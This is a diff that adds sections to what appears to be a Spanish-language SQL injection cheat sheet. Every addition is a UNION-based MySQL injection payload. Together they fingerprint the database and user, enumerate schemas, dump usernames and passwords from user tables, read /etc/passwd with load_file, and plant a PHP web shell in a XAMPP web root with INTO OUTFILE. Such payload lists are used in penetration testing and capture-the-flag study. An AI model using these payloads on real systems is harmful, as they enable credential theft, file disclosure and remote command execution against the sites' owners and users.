@@ -27,3 +27,37 @@
 ```sql
 ' UNION SELECT version(), NULL-- -
 ```
+## Nombre de la BD actual
+```sql
+' UNION SELECT NULL,database(),NULL-- -
+' UNION SELECT NULL,database(),NULL#
+```
+## Usuario
+```sql
+' UNION SELECT NULL,user(),NULL-- -
+' UNION SELECT NULL,user(),NULL#
+```
+## Enumerar las DB
+```sql
+UNION SELECT NULL,schema_name,NULL from information_schema.schemata-- -
+UNION SELECT NULL,schema_name,NULL from information_schema.schemata limit 1,1-- -
+UNION SELECT NULL,schema_name,NULL from information_schema.schemata limit 2,1-- -
+UNION SELECT NULL,schema_name,NULL from information_schema.schemata#
+UNION SELECT NULL,schema_name,NULL from information_schema.schemata limit 1,1#
+```
+## Data
+```sql
+UNION SELECT NULL,username,NULL from users-- -
+UNION SELECT NULL,password,NULL from users#
+UNION SELECT NULL,concat(Username,0x3a,Password),NULL from Colegio.Users-- -
+UNION SELECT NULL,concat(Username,0x3a,Password),NULL from Colegio.Users#
+```
+## Leyendo Archivos
+```sql
+UNION SELECT NULL,load_file('/etc/passwd'),NULL-- -
+UNION SELECT NULL,load_file('/etc/passwd'),NULL#
+```
+## Escribiendo Archivos
+```sql
+' union select ("<?php system($_GET['cmd']) ?>") into outfile "C:/xampp/htdocs/shell.php"-- -
+```
